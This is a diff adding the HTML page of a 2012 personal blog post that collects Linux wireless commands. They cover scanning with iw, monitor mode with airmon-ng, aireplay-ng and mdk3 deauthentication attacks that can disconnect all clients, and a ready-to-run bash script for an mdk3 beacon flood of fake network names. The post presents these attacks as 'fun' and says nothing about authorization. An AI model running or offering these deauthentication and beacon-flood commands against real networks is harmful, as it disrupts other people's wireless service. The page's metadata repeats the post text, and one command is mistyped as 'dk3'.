@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Wireless Fun with Aircrack and Others | Crusader Two-One</title>
+<meta name="generator" content="Jekyll v4.1.1" />
+<meta property="og:title" content="Wireless Fun with Aircrack and Others" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="A short list of some things you can do with wireless on a linux box. Have fun. Determine Modes your NIC is capable of. airmon-ng (find PHY# for your NIC) iw phy phy1 info | grep â€“A8 modes Passive Scan (Should not generate any frames) iw dev wlan0 scan passive | grep SSID Active Scan iw dev wlan0 scan | grep SSID airmon-ng start wlan0 airodump-ng mon0 iwconfig wlan0 channel # iwconfig wlan0 essid &lt;ssid&gt; iwconfig wlan0 mode managed Deauthorization iwconfig mon0 channel # aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0 -0 means deauthentication 1 is the number of deauths to send (you can send multiple if you wish); 0 means send them continuously -a 00:14:6C:7E:40:80 is the MAC address of the access point -c 00:0F:B5:34:30:30 is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated ath0 is the interface name Deauthorization with **MDK3* airmon-ng start wlan0 dk3 mon0 d or mdk3 mon0 d -w whitelist (deauth everything not listed in file) or mdk3 mon0 d -b blacklist (deauth everything listed in file) d - deauthorization mode w - whitelist b - blacklist Broadcast Network Names with MDK3 airmon-ng start wlan0 mdk3 mon0 b -c 11 -f ssid_names b - beacon flood mode c - channel f - text file with ssid names Everything you need to run a beacon flood in one script. networks=( &quot;FreeWifi&quot; &quot;FBI Van #12&quot; &quot;Customer Wireless&quot; &quot;Visitors&quot; &quot;ATTWifi&quot; &quot;Verizon Hotspot&quot; &quot;l33t haxor net&quot; ) if [ -f ssid_names ] then echo -e &quot;\e[1;31mDeleting list of network names\e[0m&quot; rm -f ssid_names fi echo -e &quot;\e[1;32mCreating list of network names\e[0m&quot; for i in &quot;${networks[@]}&quot; do echo $i &gt;&gt; ssid_names done if [[ -n $(airmon-ng | grep mon0) ]] then echo -e &quot;\e[1;32mMon0 interface exists\e[0m&quot; else echo -e &quot;\e[1;32mStarting AirMon on wlan0\e[0m&quot; airmon-ng start wlan0 fi echo -e &quot;\e[1;32mBegin beacon flood on mon0\e[0m&quot; mdk3 mon0 b -c 11 -f ssid_names 8 Linux Commands: To Find Out Wireless Network Speed, Signal Strength And Other Information aircrack-ng Deauthorize airmon-ng iwconfig man page iw command info" />
+<meta property="og:description" content="A short list of some things you can do with wireless on a linux box. Have fun. Determine Modes your NIC is capable of. airmon-ng (find PHY# for your NIC) iw phy phy1 info | grep â€“A8 modes Passive Scan (Should not generate any frames) iw dev wlan0 scan passive | grep SSID Active Scan iw dev wlan0 scan | grep SSID airmon-ng start wlan0 airodump-ng mon0 iwconfig wlan0 channel # iwconfig wlan0 essid &lt;ssid&gt; iwconfig wlan0 mode managed Deauthorization iwconfig mon0 channel # aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0 -0 means deauthentication 1 is the number of deauths to send (you can send multiple if you wish); 0 means send them continuously -a 00:14:6C:7E:40:80 is the MAC address of the access point -c 00:0F:B5:34:30:30 is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated ath0 is the interface name Deauthorization with **MDK3* airmon-ng start wlan0 dk3 mon0 d or mdk3 mon0 d -w whitelist (deauth everything not listed in file) or mdk3 mon0 d -b blacklist (deauth everything listed in file) d - deauthorization mode w - whitelist b - blacklist Broadcast Network Names with MDK3 airmon-ng start wlan0 mdk3 mon0 b -c 11 -f ssid_names b - beacon flood mode c - channel f - text file with ssid names Everything you need to run a beacon flood in one script. networks=( &quot;FreeWifi&quot; &quot;FBI Van #12&quot; &quot;Customer Wireless&quot; &quot;Visitors&quot; &quot;ATTWifi&quot; &quot;Verizon Hotspot&quot; &quot;l33t haxor net&quot; ) if [ -f ssid_names ] then echo -e &quot;\e[1;31mDeleting list of network names\e[0m&quot; rm -f ssid_names fi echo -e &quot;\e[1;32mCreating list of network names\e[0m&quot; for i in &quot;${networks[@]}&quot; do echo $i &gt;&gt; ssid_names done if [[ -n $(airmon-ng | grep mon0) ]] then echo -e &quot;\e[1;32mMon0 interface exists\e[0m&quot; else echo -e &quot;\e[1;32mStarting AirMon on wlan0\e[0m&quot; airmon-ng start wlan0 fi echo -e &quot;\e[1;32mBegin beacon flood on mon0\e[0m&quot; mdk3 mon0 b -c 11 -f ssid_names 8 Linux Commands: To Find Out Wireless Network Speed, Signal Strength And Other Information aircrack-ng Deauthorize airmon-ng iwconfig man page iw command info" />
+<link rel="canonical" href="http://localhost:4000/it/2012/11/04/Wireless-Fun-with-Aircrack-and-Others.html" />
+<meta property="og:url" content="http://localhost:4000/it/2012/11/04/Wireless-Fun-with-Aircrack-and-Others.html" />
+<meta property="og:site_name" content="Crusader Two-One" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2012-11-04T23:00:00-06:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","url":"http://localhost:4000/it/2012/11/04/Wireless-Fun-with-Aircrack-and-Others.html","headline":"Wireless Fun with Aircrack and Others","dateModified":"2012-11-04T23:00:00-06:00","datePublished":"2012-11-04T23:00:00-06:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/it/2012/11/04/Wireless-Fun-with-Aircrack-and-Others.html"},"description":"A short list of some things you can do with wireless on a linux box. Have fun. Determine Modes your NIC is capable of. airmon-ng (find PHY# for your NIC) iw phy phy1 info | grep â€“A8 modes Passive Scan (Should not generate any frames) iw dev wlan0 scan passive | grep SSID Active Scan iw dev wlan0 scan | grep SSID airmon-ng start wlan0 airodump-ng mon0 iwconfig wlan0 channel # iwconfig wlan0 essid &lt;ssid&gt; iwconfig wlan0 mode managed Deauthorization iwconfig mon0 channel # aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0 -0 means deauthentication 1 is the number of deauths to send (you can send multiple if you wish); 0 means send them continuously -a 00:14:6C:7E:40:80 is the MAC address of the access point -c 00:0F:B5:34:30:30 is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated ath0 is the interface name Deauthorization with **MDK3* airmon-ng start wlan0 dk3 mon0 d or mdk3 mon0 d -w whitelist (deauth everything not listed in file) or mdk3 mon0 d -b blacklist (deauth everything listed in file) d - deauthorization mode w - whitelist b - blacklist Broadcast Network Names with MDK3 airmon-ng start wlan0 mdk3 mon0 b -c 11 -f ssid_names b - beacon flood mode c - channel f - text file with ssid names Everything you need to run a beacon flood in one script. networks=( &quot;FreeWifi&quot; &quot;FBI Van #12&quot; &quot;Customer Wireless&quot; &quot;Visitors&quot; &quot;ATTWifi&quot; &quot;Verizon Hotspot&quot; &quot;l33t haxor net&quot; ) if [ -f ssid_names ] then echo -e &quot;\\e[1;31mDeleting list of network names\\e[0m&quot; rm -f ssid_names fi echo -e &quot;\\e[1;32mCreating list of network names\\e[0m&quot; for i in &quot;${networks[@]}&quot; do echo $i &gt;&gt; ssid_names done if [[ -n $(airmon-ng | grep mon0) ]] then echo -e &quot;\\e[1;32mMon0 interface exists\\e[0m&quot; else echo -e &quot;\\e[1;32mStarting AirMon on wlan0\\e[0m&quot; airmon-ng start wlan0 fi echo -e &quot;\\e[1;32mBegin beacon flood on mon0\\e[0m&quot; mdk3 mon0 b -c 11 -f ssid_names 8 Linux Commands: To Find Out Wireless Network Speed, Signal Strength And Other Information aircrack-ng Deauthorize airmon-ng iwconfig man page iw command info","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Crusader Two-One" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Crusader Two-One</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Wireless Fun with Aircrack and Others</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2012-11-04T23:00:00-06:00" itemprop="datePublished">Nov 4, 2012
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>A short list of some things you can do with wireless on a linux box. Have fun.</p>
+
+<p><strong><em>Determine Modes your NIC is capable of.</em></strong></p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="p">(</span><span class="n">find</span> <span class="no">PHY</span><span class="c1"># for your NIC)
+</span>
+<span class="n">iw</span> <span class="n">phy</span> <span class="n">phy1</span> <span class="n">info</span> <span class="o">|</span> <span class="n">grep</span> <span class="err">â€“</span><span class="no">A8</span> <span class="n">modes</span></code></pre></figure>
+
+<p><strong><em>Passive Scan (Should not generate any frames)</em></strong></p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">iw</span> <span class="n">dev</span> <span class="n">wlan0</span> <span class="nb">scan</span> <span class="n">passive</span> <span class="o">|</span> <span class="n">grep</span> <span class="no">SSID</span></code></pre></figure>
+
+<p><strong><em>Active Scan</em></strong></p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">iw</span> <span class="n">dev</span> <span class="n">wlan0</span> <span class="nb">scan</span> <span class="o">|</span> <span class="n">grep</span> <span class="no">SSID</span>
+<span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="n">start</span> <span class="n">wlan0</span>
+<span class="n">airodump</span><span class="o">-</span><span class="n">ng</span> <span class="n">mon0</span>
+<span class="n">iwconfig</span> <span class="n">wlan0</span> <span class="n">channel</span> <span class="c1">#
+</span>
+<span class="n">iwconfig</span> <span class="n">wlan0</span> <span class="n">essid</span> <span class="o">&lt;</span><span class="n">ssid</span><span class="o">&gt;</span>
+<span class="n">iwconfig</span> <span class="n">wlan0</span> <span class="n">mode</span> <span class="n">managed</span></code></pre></figure>
+
+<p><strong><em>Deauthorization</em></strong></p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">iwconfig</span> <span class="n">mon0</span> <span class="n">channel</span> <span class="c1">#
+</span>
+<span class="n">aireplay</span><span class="o">-</span><span class="n">ng</span> <span class="o">-</span><span class="mi">0</span> <span class="mi">1</span> <span class="o">-</span><span class="n">a</span> <span class="mo">00</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mi">6</span><span class="no">C</span><span class="p">:</span><span class="mi">7</span><span class="no">E</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">80</span> <span class="o">-</span><span class="n">c</span> <span class="mo">00</span><span class="p">:</span><span class="mi">0</span><span class="no">F</span><span class="ss">:B5</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">30</span> <span class="n">ath0</span></code></pre></figure>
+
+<ul>
+  <li>-0 means deauthentication</li>
+  <li>1 is the number of deauths to send (you can send multiple if you wish); 0 means send them continuously</li>
+  <li>-a 00:14:6C:7E:40:80 is the MAC address of the access point</li>
+  <li>-c 00:0F:B5:34:30:30 is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated</li>
+  <li>ath0 is the interface name</li>
+</ul>
+
+<p><strong><em>Deauthorization with **</em>MDK3</strong>*</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="n">start</span> <span class="n">wlan0</span>
+<span class="n">dk3</span> <span class="n">mon0</span> <span class="n">d</span></code></pre></figure>
+
+<p>or</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">mdk3</span> <span class="n">mon0</span> <span class="n">d</span> <span class="o">-</span><span class="n">w</span> <span class="n">whitelist</span> <span class="p">(</span><span class="n">deauth</span> <span class="n">everything</span> <span class="n">not</span> <span class="n">listed</span> <span class="k">in</span> <span class="n">file</span><span class="p">)</span></code></pre></figure>
+
+<p>or</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">mdk3</span> <span class="n">mon0</span> <span class="n">d</span> <span class="o">-</span><span class="n">b</span> <span class="n">blacklist</span> <span class="p">(</span><span class="n">deauth</span> <span class="n">everything</span> <span class="n">listed</span> <span class="k">in</span> <span class="n">file</span><span class="p">)</span>
+
+<span class="n">d</span> <span class="o">-</span> <span class="n">deauthorization</span> <span class="n">mode</span>
+<span class="n">w</span> <span class="o">-</span> <span class="n">whitelist</span>
+<span class="n">b</span> <span class="o">-</span> <span class="n">blacklist</span></code></pre></figure>
+
+<p><strong><em>Broadcast Network Names with MDK3</em></strong></p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="n">start</span> <span class="n">wlan0</span>
+<span class="n">mdk3</span> <span class="n">mon0</span> <span class="n">b</span> <span class="o">-</span><span class="n">c</span> <span class="mi">11</span> <span class="o">-</span><span class="n">f</span> <span class="n">ssid_names</span></code></pre></figure>
+
+<ul>
+  <li>b - beacon flood mode</li>
+  <li>c - channel</li>
+  <li>f - text file with ssid names
+Everything you need to run a beacon flood in one script.</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">networks</span><span class="o">=</span><span class="p">(</span>
+<span class="s2">"FreeWifi"</span>
+<span class="s2">"FBI Van #12"</span>
+<span class="s2">"Customer Wireless"</span>
+<span class="s2">"Visitors"</span>
+<span class="s2">"ATTWifi"</span>
+<span class="s2">"Verizon Hotspot"</span>
+<span class="s2">"l33t haxor net"</span>
+<span class="p">)</span>
+
+<span class="k">if</span> <span class="p">[</span> <span class="o">-</span><span class="n">f</span> <span class="n">ssid_names</span> <span class="p">]</span>
+<span class="k">then</span>
+<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s2">"</span><span class="se">\e</span><span class="s2">[1;31mDeleting list of network names</span><span class="se">\e</span><span class="s2">[0m"</span>
+<span class="n">rm</span> <span class="o">-</span><span class="n">f</span> <span class="n">ssid_names</span>
+<span class="n">fi</span>
+
+<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s2">"</span><span class="se">\e</span><span class="s2">[1;32mCreating list of network names</span><span class="se">\e</span><span class="s2">[0m"</span>
+<span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="s2">"${networks[@]}"</span>
+<span class="k">do</span>
+<span class="n">echo</span> <span class="vg">$i</span> <span class="o">&gt;&gt;</span> <span class="n">ssid_names</span>
+<span class="n">done</span>
+
+<span class="k">if</span> <span class="p">[[</span> <span class="o">-</span><span class="n">n</span> <span class="err">$</span><span class="p">(</span><span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">mon0</span><span class="p">)</span> <span class="p">]]</span>
+<span class="k">then</span>
+<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s2">"</span><span class="se">\e</span><span class="s2">[1;32mMon0 interface exists</span><span class="se">\e</span><span class="s2">[0m"</span>
+<span class="k">else</span>
+<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s2">"</span><span class="se">\e</span><span class="s2">[1;32mStarting AirMon on wlan0</span><span class="se">\e</span><span class="s2">[0m"</span>
+<span class="n">airmon</span><span class="o">-</span><span class="n">ng</span> <span class="n">start</span> <span class="n">wlan0</span>
+<span class="n">fi</span>
+
+<span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s2">"</span><span class="se">\e</span><span class="s2">[1;32mBegin beacon flood on mon0</span><span class="se">\e</span><span class="s2">[0m"</span>
+<span class="n">mdk3</span> <span class="n">mon0</span> <span class="n">b</span> <span class="o">-</span><span class="n">c</span> <span class="mi">11</span> <span class="o">-</span><span class="n">f</span> <span class="n">ssid_names</span></code></pre></figure>
+
+<ul>
+  <li><a href="http://www.cyberciti.biz/tips/linux-find-out-wireless-network-speed-signal-strength.html" target="_blank">8 Linux Commands: To Find Out Wireless Network Speed, Signal Strength And Other Information</a></li>
+  <li><a style="text-decoration: underline;" title="airplay-ng Deauthentication" href="http://www.aircrack-ng.org/doku.php?id=deauthentication" target="_blank">aircrack-ng Deauthorize</a></li>
+  <li><a href="http://www.aircrack-ng.org/doku.php?id=airmon-ng" target="_blank">airmon-ng</a></li>
+  <li><a href="http://www.linuxcommand.org/man_pages/iwconfig8.html" target="_blank">iwconfig man page</a></li>
+  <li><a href="http://wireless.kernel.org/en/users/Documentation/iw" target="_blank">iw command info</a></li>
+</ul>
+
+
+  </div><a class="u-url" href="/it/2012/11/04/Wireless-Fun-with-Aircrack-and-Others.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Crusader Two-One</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Crusader Two-One</li><li><a class="u-email" href="mailto:joseph.streeter76@gmail.com">joseph.streeter76@gmail.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/josephstreeter"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">josephstreeter</span></a></li><li><a href="https://www.twitter.com/josephstreeter"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">josephstreeter</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
